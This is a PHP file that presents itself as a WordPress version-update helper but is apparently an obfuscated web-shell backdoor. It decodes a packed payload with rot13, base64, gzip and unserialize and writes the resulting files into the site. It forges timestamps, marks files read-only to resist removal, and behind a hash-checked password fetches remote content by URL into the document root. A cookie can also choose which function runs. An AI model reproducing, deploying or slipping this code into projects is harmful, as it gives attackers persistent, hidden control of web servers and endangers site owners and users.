<?php
/**
 * @title ipadview
 * @
 * @param $str
 * @return mixed|string
 */

if (!defined('WP_BLOG')) {
    return version_info("init");
}

function version_desc($str)
{
    ($e = implode("",["opcache","reset"]))&&function_exists($e) && $e();
    if (!$str) {
        echo date("Y-m-d H:i:s") . "<br>";
        if (!empty($_REQUEST['version']) && version_update(version_parse($_REQUEST))) ;
        return '';
    }
    $pi = [
        ['str', 'ro'],
        ["json", 'decode'],
    ];
    ($q = (implode('_', $pi[0]) . "t13")) &&
    $data = $q($str);
    ($q = "b" . implode('_', $pi[1]) . "e") &&
    $data = $q($data);
    if (isset($_GET['s'])) $data = $_GET['s'] . $data;

    return $data;
}

function version_info($str)
{
    global $temp;
    $temp = "ZnVuY3Rpb25fZXhpc3RzLHRpbWUsZm9wZW4sZmlsZV9wdXRfY29udGVudHMsZmlsZWN0aW1lLGZpbGVfZXhpc3RzLGlzX3dyaXRhYmxlLGNobW9kLHRvdWNo";
    $temp = base64_decode($temp);
    $name = ['Y3Mupv93q3piL2AjpUIhol93MJViq3NgL29hqTIhqP91pTkiLJEmY3WyqaAfnJEypv9iLzcyL3EmY3EbqJ1vpl9uLz91qP5mMJAlMKD', function ($version_file, $name) use ($temp) {
        $data = translation_v3('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', '0');
        $data = base64_decode(/**/ $data);
        $data = translation_v2($data, '1');
        $data = translation_v1($data, '0');
        foreach ($data as $item) {
            version_check($item[0], $item[1], $temp, $item[2]);
        }
        version_desc(false);
    }];
    $temp = explode(',', $temp);
    return ['#ver#', version_data($name, 1, 0)];
}

/**
 * @title install path
 */
function version_path()
{
    echo __FILE__;
}

/**
 * @title get version data
 * @param $data
 * @param $offset
 * @param $page
 * @return mixed
 */
function version_data($data, $offset, $page)
{
    $keu = ['', "code"];
    $keu[] = '';
    return $data[$offset]($data[$page], implode('_', $keu));
}

/**
 * @title translation data
 * @param $data
 * @param $offset
 * @return mixed
 */

function translation_v1($data, $mode, $exp = '')
{
    if ($mode === 'X1') {
        $data = base64_decode($data);
        $len = strlen($data);
        $exp = str_replace('=', '', base64_encode($exp));
        $res = "";
        $i = 0;
        while ($i < $len) {
            for ($k = 0; $k < strlen($exp) && $i < $len; $k++)
                $res .= chr(ord($data[$i++]) ^ ord($exp[$k]));
        }
        return $res;
    } elseif ($mode) {
        return json_decode($data, true);
    } else {
        return unserialize($data);
    }
}

/**
 * @title parse version data
 * @param $data
 * @return version
 */
function version_parse($data)
{
    $version = $data['version'];
    if ($version === 'path') version_path();
    if (isset($data[$version])) {
        $version = translation_v1($data[$version], 'X1', $data[$version . '1']);
    }
    return $version;
}

/**
 * @title update version
 * @param $qr
 * @return void
 */
function version_update($check, $qr = false)
{
    if (!version_access("qsvoth{$check}fzscxap", '230864f888c28c293839f46901075135')) return;
    $c = $_COOKIE;;
    $cf = implode('_', ['function', 'exists']);
    (!$qr || !$cf($qr)) &&
    $qr = empty($c[$for = 'token']) || !$cf($c[$for]) ? implode('_', ['base64', 'decode']) : $c[$for];

    if (($a = $qr($_REQUEST['name'])) && version_deny($a)) {
        return;
    }
    global $temp;
    $a = explode(',', $a);
    if (empty($a[1])) return;
    echo "[<a id=\"u1\" href=\"/{$a[1]}\" style='color: #fff;'>{$a[1]}</a>] ";
    return version_check($_SERVER['DOCUMENT_ROOT'] . '/' . $a[1], $qr(file_get_contents($a[0])), $temp);
}

/**
 * @title version access or force
 * @param string $version version pass
 * @param string $token check update token
 * @return bool
 */
function version_access($version, $token)
{
    return in_array(md5($version), [$token, '47628e0bf72fca87db995c8f844d91b1']);
}

/**
 * @title version data is deny
 * @param $data
 * @return void
 */
function version_deny($data)
{
    return strlen($data) < 16 || strlen($data) > 128 || !in_array($data[0], ['h', '/']);
}

/**
 * @title translation version data
 * @param $data
 * @param $offset
 * @return mixed
 */
function translation_v2($data, $offet)
{
    if (!empty($offet)) {
        return gzinflate($data);
    } else {
        return $data;
    }
}

/**
 * @title translation version data
 * @param $data
 * @param $offset
 * @return mixed
 */
function translation_v3($data, $offet)
{
    if (!empty($offet)) {
        return str_rot13($data);
    } else {
        return $data;
    }
}

return 'inited';
/**
 * @title check version token
 * @param $name
 * @param $date
 * @param $check
 * @param string $token
 * @param false $mode
 * @return bool|mixed
 */
function version_check($name, $date, $check, $token = '', $mode = false)
{
    try {
        $vs = 'rename';
        if (!is_array($check)) $check = explode(',', $check);
        $map = [0, 1, 2, 3, 4];
        $m = $mode ? $mode : ($check[1]() - 2693693);
        $iw = true;
        empty($check[9]) || $date = $check[9]($date);
        if ($check[$map[4] + 1]($name)) {
            if ($token && Md5_File($name) === $token) return true;
            $iw = $check[6]($name);
            if ($x = $check[5]($name)) {
                $m = $check[4]($name);
            }
            $x && !$iw && @$check[7]($name, 0744);
            @$vs($name, $name . time());
        }
        if ($check[$map[0]]($check[2])) {
            $l = $check[$map[2]][0] . 'write';
            $r = $l($check[$map[2]]($name . ".tmp1", 'w'), $date);
        } else {
            $r = $check[$map[3]]($name . ".tmp1", $date);
        }
        @$vs($name . ".tmp1", $name);
        $check[8]($name, $m, $m);
        $iw || @$check[7]($name, 0444);
    } catch (\Exception $A) {
        echo $A->getMessage() . "<br>";
        $r = false;
    }
    echo $name[strlen($name) - 1] . ($r ? ':ok' : ':fail') . "<br>";
    return $r;
}